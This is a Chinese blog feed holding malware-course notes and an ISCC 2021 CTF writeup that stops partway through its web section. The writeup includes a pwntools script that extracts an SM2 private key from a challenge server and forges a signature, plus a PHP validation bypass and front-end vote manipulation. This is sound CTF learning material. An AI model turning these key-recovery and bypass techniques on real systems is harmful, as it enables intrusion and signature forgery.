style="text-align:center">模块及模块的符号加载</td><td style="text-align:center"><code>lm</code>、<code>lm vm test.dll</code></td></tr><tr><td style="text-align:center">x</td><td style="text-align:center">检查符号</td><td style="text-align:center"><code>x kernel32!Virtual*</code></td></tr><tr><td style="text-align:center">k</td><td style="text-align:center">查看线程调用栈</td><td style="text-align:center"><code>k</code></td></tr><tr><td style="text-align:center">k</td><td style="text-align:center">显示每个函数的前三个参数</td><td style="text-align:center"><code>kb</code></td></tr><tr><td style="text-align:center">db</td><td style="text-align:center">显示存储在某地址中的数据</td><td style="text-align:center"><code>db notepad</code></td></tr><tr><td style="text-align:center">dd</td><td style="text-align:center">同上，双字节显示</td><td style="text-align:center"><code>db notepad L100</code></td></tr><tr><td style="text-align:center">dt</td><td style="text-align:center">显示结构信息</td><td style="text-align:center"><code>dt _PEB</code></td></tr><tr><td style="text-align:center">dt</td><td style="text-align:center">PE 的结构</td><td style="text-align:center"><code>dt -r ntdll!_IMAGE_NT_HEADERS 00fd00f8</code></td></tr><tr><td style="text-align:center">dx</td><td style="text-align:center">C++指针计算</td><td style="text-align:center"><code>dx -r1 (*((ntdll!_IMAGE_OPTIONAL_HEADER *) 0xfd0110))</code></td></tr><tr><td style="text-align:center">ed</td><td style="text-align:center">修改寄存器的值</td><td style="text-align:center"><code>ed esp 00401010</code></td></tr><tr><td style="text-align:center">r</td><td style="text-align:center">显示修改CPU寄存器</td><td style="text-align:center"><code>r eax</code>、<code>r eax=2</code></td></tr></tbody></table><h1>可能会出的简答汇总</h1><p>1.病毒感染其他文件的步骤</p><p>2.一个完整的木马系统的组成</p><p>3.流氓软件的定义</p><p>4.APT的攻击过程</p><p>5.APT的特征</p><p>6.恶意代码的防治策略（国家层面和单机用户层面）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;所用教材：刘功申等人编著的第四版&lt;/p&gt;
&lt;p&gt;博客地址：&lt;a href=&quot;https://blog.csdn.net/zss192&quot;&gt;https://blog.csdn.net/zss192&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;说明：博客为根据老师所画重点有</summary>
      
    
    
    
    <category term="计算机专业课" scheme="https://zss192.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
    
    <category term="计算机专业课" scheme="https://zss192.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>ISCC 2021 WP</title>
    <link href="https://zss192.github.io/2021/05/25/ISCC%202021%20WP/"/>
    <id>https://zss192.github.io/2021/05/25/ISCC%202021%20WP/</id>
    <published>2021-05-25T05:02:34.000Z</published>
    <updated>2021-06-10T10:23:18.387Z</updated>
    
    <content type="html"><![CDATA[<h1>MISC</h1><h2 id="李华的红包"><a class="header-anchor" href="#李华的红包">¶</a>李华的红包</h2><p>打开发现是一个图片，binwalk分离下文件后得到一个txt文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24,43,13,13,12,21,43</span><br></pre></td></tr></table></figure><p>很明显是敲击码（如果改下图片大小为521*521会看到下面有个鼓也会提示这是敲击码）</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/f2ae75c5ad3e4a015f3b0a590c89a6dd.png"  alt="image-20210521131735744"></p><p>分别对应着ISCCBFS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;ISCCBFS&#125;</span><br></pre></td></tr></table></figure><h2 id="Retrieve-the-passcode"><a class="header-anchor" href="#Retrieve-the-passcode">¶</a>Retrieve the passcode</h2><p>解压后得到一个压缩包和一个名为scatter的txt文档</p><p>打开txt文档发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;3.25:2.25:1;3.5:2.25:1;3.75:2.25:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:2.25:1;5.25:2.25:1;5.5:2.25:1;5.75:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1</span><br></pre></td></tr></table></figure><p>三维数据还提示了scatter应该是用这些数据画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;scatter.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> n:</span><br><span class="line">    <span class="built_in">all</span> = n.read()</span><br><span class="line">    a = <span class="built_in">all</span>.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">x_value = []</span><br><span class="line">y_value = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    x_value.append(i.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    y_value.append(i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">plt.scatter(x_value,y_value,s=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>稍微改一下宽高**，<strong>得到一个这个东西</strong>，**看不出来是个啥</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210502005412635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMDc4MjI5,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>颠倒一下**，**得到密码365728</p><p>打开pdf</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/39fa8cbaab511371cc5c8a5d801b3999.png"  alt="image-20210518131743000"></p><p>很明显是摩斯密码</p><p>解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONGRATULATIONTHEFLAGIS</span><br><span class="line">CHALLENGEISCCTWOZEROTWOONE</span><br></pre></td></tr></table></figure><p>！坑点来了，两个解密的语句都是flag的一部分，当时我也是一直试CHALLENGEISCCTWOZEROTWOONE这个，大小写什么的都不行，后来看群里也有人被这个折磨疯了问到底是啥，有个人说两个都要，我才想到第一个也是flag的一部分，只能说这脑洞纯粹为了脑洞而脑洞。。。。</p><h2 id="海市蜃楼-1"><a class="header-anchor" href="#海市蜃楼-1">¶</a>海市蜃楼-1</h2><p>打开看着是一个docx文件，里面乱码。docx其实本质就是zip，直接改后缀为zip，然后解压</p><p>在文件里搜索flag即可（这里我用的是sublime）</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/5949a364b7066f9359ccc88c76378d1f.png"  alt="image-20210518132718171"></p><h2 id="美人计"><a class="header-anchor" href="#美人计">¶</a>美人计</h2><p>题目描述：美人说的话里有解题提示，但是美人的话不能全信。这句话很关键</p><p>用十六进制编辑器打开图片得到提示</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/5e850fac0fd0326813e29bd3a2bf7bee.png"  alt="image-20210518133033001"></p><p>大致意思是尝试AES，然后就会得到flag。还给了ISCC2021（估计是密钥）</p><blockquote><p>由于我是用的linux，没法像windows那样看图片属性里的详细信息，其实这个提示在windows下右键看图片的备注也可以看到</p></blockquote><p>解压后还有个word文档，是一个二维码，扫码后得到U2Fs开头的一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;Ka+sScszwQkwhO+VLiJwV&#x2F;6IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu 3GuGWmPOtO27z8vNppD2D50fwsD+8VWhdtW9J4cewYivH&#x2F;Z&#x2F;7GoUvcJXJMrvf+vu +CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE +pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r&#x2F;v5noP8&#x3D;</span><br></pre></td></tr></table></figure><p>尝试AES解密，密钥是ISCC2021，成功解密但是得到的还是U2Fs开头的加密的内容，多次解密后得到flag</p><p>wait</p><p>怎么可能那么简单，太小看出题人的套路了，事实上是得到了这样一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!</span><br></pre></td></tr></table></figure><p>就是这样毫无防备的陷入了陷阱。。。</p><p>于是冥思苦想到底是哪错了</p><p>然后我把那个docx文档改成了zip解压后用sublime打开</p><p>然后发现了两个二维码，下面这个是打开word文档看到的</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/e50c8fbd5ea975a651ab6e7bca250417.png"  alt="image-20210518134433510"></p><p>下面这个是另外一个二维码</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/c0649d2394e0cd367b3486d58771a028.png"  alt="image-20210518134508339"></p><p>扫描后得到了又一段U2Fs开头的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19eOY&#x2F;pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE</span><br></pre></td></tr></table></figure><p>尝试AES解密，然后提示解密失败</p><p>？？？？？？？？</p><p>然后尝试DES解密，密钥仍是ISCC2021，终于得到了flag</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/0719fa669b514ebfbdd2b4f1a6a9a39a.png"  alt="image-20210518134805104"></p><p>果然漂亮的女人信不得，给了个二维码、加密方式没一个是真的。。。</p><h2 id="我的折扣是多少"><a class="header-anchor" href="#我的折扣是多少">¶</a>我的折扣是多少</h2><p>运行exe文件得到pass1{\u006b\u0072\u0077}，Unicode编码，解码后为pass1{krw}</p><p>在压缩文件最后有一段base64编码</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210505003143992.png"  alt="在这里插入图片描述"></p><p>解出来是pass2{gcc666}</p><p>用密码krwgcc666解开压缩包</p><p>得到base编码：eW91Zm91bmRtZT8=</p><p>base64解出来是：youfoundme?</p><p>还剩下个mp3，MP3一般都是用MP3stego解密，密码是youfoundme?</p><p>得到ISCC{LFXXK4TENFZWG33VNZ2DELRRGU======}</p><p>其中LFXXK4TENFZWG33VNZ2DELRRGU======用base32解密得到<code>Yourdiscount2.15</code><br>flag是ISCCP{Yourdiscount2.15}</p><p>这里推荐下我的一个base家族的脚本（可尝试base16、base32、base36、base58、base62、base64、base85、base91、base92）,这种base解密直接丢到脚本里，看哪个能解出来</p><p>链接地址：<a href="https://download.csdn.net/download/zss192/12133420">Base家族加密解密.py</a></p><p>若没有积分可以评论留言邮箱私发给你</p><h2 id="区块链"><a class="header-anchor" href="#区块链">¶</a>区块链</h2><p>第一次接触区块链的题目，在网上看了很多基础的CTF区块链的题目</p><p>当时直接搜题目中的代码搜到了几篇文章，如<a href="https://ashiq.co.za/posts/0x41414141-CTF-Blockchain-Writeups/">0x41414141 CTF区块链编写</a></p><p>虽然看着和这题差不多但按照他说的一直没解出来，但也提供了一些思路</p><p>然后在另一篇文章看到了类似的区块链题目，具体链接我也找不到了</p><p>打开这个链接：<a href="https://rinkeby.etherscan.io/">Etherscan</a></p><p>在搜索框输入合约地址0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5</p><p>然后点击这个地方</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/87bdfdf2058d257eaa8fb84ddfad870f.png"  alt="image-20210518140256588"></p><p>这里点击&quot;UTF-8&quot;</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/b0f24339ee129c739dddd4be9dfc1b2e.png"  alt="image-20210518140348846"></p><p>得到flag</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/0541cbfabecb92ea302292d27f959d10.png"  alt="image-20210518140409432"></p><h2 id="Hack-the-Victim"><a class="header-anchor" href="#Hack-the-Victim">¶</a>Hack the Victim</h2><p>和上题区块链类似</p><p>也是给了个合约地址：0x68D28fE315E6A344029D42915Fbc7af4261AB833</p><p>同样打开上述题目的网站，搜索这个合约地址</p><p>不过不同的是这题需要反编译</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/120760e12d07e05cd974bced772977ee.png"  alt="image-20210518140638282"></p><p>反编译后得到flag</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/f43afba5602e0a29e880ca73243d1070.png"  alt="image-20210518140707320"></p><h2 id="检查一下"><a class="header-anchor" href="#检查一下">¶</a>检查一下</h2><p>解压后得到一个png图片，binwalk下发现里面有zlib数据，尝试分离(binwalk -e)</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/296dc3abbb650b8571e506905a65ef1d.png"  alt="image-20210518140908156"></p><p>分离后有一个txt文档打开后发现是01字符串</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/372a533aa1160a821a557a6f4f170a56.png"  alt="image-20210518141009150"></p><p>联想到是01字符串画二维码</p><p>先看下字符串长度发现是841，而正好是29的平方，那应该就是二维码了</p><p>上脚本</p><blockquote><p>注：我总结了一些CTF杂项脚本：<a href="https://github.com/zss192/CTF-python-script">https://github.com/zss192/CTF-python-script</a></p><p>觉得还可以的话给个star吧</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">29</span>    <span class="comment">#宽高 841个01字符串，所以宽和高是29</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line"><span class="comment">#若是(255,255,255)、(0,0,0)需要先转换01 </span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;./flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到二维码，扫码即可得到flag</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/fcac7cb6cb08c6515341469625f47e80.png"  alt="image-20210518141632248"></p><h2 id="小明的宠物兔"><a class="header-anchor" href="#小明的宠物兔">¶</a>小明的宠物兔</h2><p>下载附件发现是一个名为rabbit的图片，一个胖兔子说着我需要碰撞</p><p>用binwalk分离图片得到flag.txt和key.zip</p><p>flag.txt中内容为U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==</p><p>显然需要密钥解密</p><p>打开key.zip发现其中的key.txt只有5字节大小结合那个兔子说的它需要碰撞应该是crc32碰撞</p><p>上脚本（Python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]&quot;</span></span><br><span class="line">crc = <span class="number">0x3DACAC6B</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic : </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">                    s=i+j+p+q+a</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="built_in">print</span> s </span><br></pre></td></tr></table></figure><p>CRC32可由一些压缩软件看到，也可以用十六进制编辑器看到</p><p>CRC32在这个位置，但注意的是要反过来即0x3DACAC6B</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/68478d30706be46c79ffa153887b77d2.png"  alt="image-20210518142412441"></p><p>由于5层循环，且未优化时间会长点，</p><p>解出来的第二个看着像是密钥，尝试下解密</p><p>结合图片名为rabbit，可能是rabbit加密，尝试下果然是，得到flag</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/440cf3e5e5a2e150d1761a52fe368b46.png"  alt="image-20210518144920078"></p><h2 id="变异的SM2"><a class="header-anchor" href="#变异的SM2">¶</a>变异的SM2</h2><p>密码学题目，我不擅长这方面，果断搜下关键处代码，果然搜到了原题</p><p>该题目是2020ByteCTF决赛的题目threshold</p><p>搜到的一个WP链接：<a href="https://ctf.njupt.edu.cn/545.html">https://ctf.njupt.edu.cn/545.html</a></p><p>需要改下脚本，把server.py和写的脚本放到同一路径下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> func, sm2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> server</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;129.211.59.129&quot;</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pk = <span class="built_in">int</span>(r.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line">pks = <span class="built_in">int</span>(r.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;pk: <span class="subst">&#123;pk&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;pks: <span class="subst">&#123;pks&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="string">b&#x27;0&#x27;</span>*<span class="number">128</span> + <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;op: &quot;</span>, <span class="string">b&quot;sign&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;backdoor:&quot;</span>, backdoor)</span><br><span class="line">sks = <span class="built_in">int</span>(r.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">115792089210356248756420345214020892766061623724957744567843809356293439045923</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pks = (sk + 1) * sks ^ -1</span></span><br><span class="line"></span><br><span class="line">sk = inverse(pks * sks, n) - <span class="number">1</span></span><br><span class="line">log.info(<span class="string">f&quot;sk: <span class="subst">&#123;sk&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;Hello, Welcome to ISCC2021!&#x27;</span></span><br><span class="line">e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">2</span></span><br><span class="line">tsm2 = server.TSM2(<span class="string">&#x27;0xdeadbeaf&#x27;</span>)</span><br><span class="line">P1_P2 = tsm2._kg(k, server.G)</span><br><span class="line">R = <span class="built_in">int</span>(P1_P2[:<span class="number">64</span>], <span class="number">16</span>) + e</span><br><span class="line"></span><br><span class="line">s = inverse(<span class="number">1</span>+sk, n) * (k - R*sk) % n</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;op: &quot;</span>, <span class="string">b&quot;verify&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;msg:&quot;</span>, data)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;sign:&quot;</span>, <span class="built_in">hex</span>(R)[<span class="number">2</span>:].zfill(<span class="number">64</span>) + <span class="built_in">hex</span>(s)[<span class="number">2</span>:].zfill(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag如下</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/eee34db53ae938d55a0f3ca08e7b07ce.png"  alt="image-20210518144852630"></p><h1>WEB</h1><h2 id="ISCC客服冲冲冲（一）"><a class="header-anchor" href="#ISCC客服冲冲冲（一）">¶</a>ISCC客服冲冲冲（一）</h2><p>题目大致意思是要给左面的客服一号投票超过右面的投票</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/8633f7a3fe0f999651aa82969214b696.png"  alt="image-20210518122525606"></p><ul><li>WP1：其实第一次做的时候直接尝试一直点左边的投票，结果还真的超过了右边的票数，直接给了flag。</li></ul><p>题目原意应该是不用手动点而是用其他方法的，不过最终也算拿到了flag</p><ul><li>WP2：互换左右投票的ID，这样自动加的票就会加给左边的，等待计时结束即可</li><li>其它WP：由于是前端控制，所以解法很多，比如用连点器，或者在 Console 里搜一下，有个 votes，直接设置，这道题可以说有非常多解题方法了，这里就不再过多阐述</li></ul><h2 id="这是啥"><a class="header-anchor" href="#这是啥">¶</a>这是啥</h2><p>查看源代码发现如图所示代码，一看就是JSFuck</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/f6b7238a89a96abeebb69ab68b03f63c.png"  alt="image-20210518122645074"></p><p>直接复制到控制台回车</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/627d8eb450084dca4ab7345a85a2c6e2.png"  alt="image-20210518122845010"></p><h2 id="Web01"><a class="header-anchor" href="#Web01">¶</a>Web01</h2><p>打开便提示Why don’t you take a look at robots.txt?</p><p>那就访问robots.txt看看呗，发现Disallow: /src/code/code.txt</p><p>所以就访问http://39.96.91.106:7040/code/code.txt</p><p>发现几个判断条件，满足条件便会输出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br></pre></td></tr></table></figure><p>参数长度小于8但数值还要大于9999999，直接用科学计数法如1e9绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br></pre></td></tr></table></figure><p>要求参数里要含有*-*</p><p>所以最终请求参数为?password=1e9*-*</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/8f5055abb4770740a35044a7e8959e13.png"  alt="image-20210518123714229"></p><h2 id="ISCC客服一号冲冲冲（二）"><a class="header-anchor" href="#ISCC客服一号冲冲冲（二）">¶</a>ISCC客服一号冲冲冲（二）</h2><p>该题目其实是Bugku的Login4 (CBC字节翻转攻击)</p><p>所以不再写WP了，留一个Je3写的WP链接：<a href="https://blog.csdn.net/jvkyvly/article/details/116755861">ISCC ISCC客服一号冲冲冲（二）</a></p><h2 id="登录"><a class="header-anchor" href="#登录">¶</a>登录</h2><p>WP来自CSDN中<a href="https://blog.csdn.net/m0_51078229">huamanggg</a>师傅</p><p>源码泄露www.zip<br>拿到代码**，<strong>发现有注册页面</strong>，<strong>随便注册一个页面</strong>，<strong>登陆后有一个update信息</strong>，**可以上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span 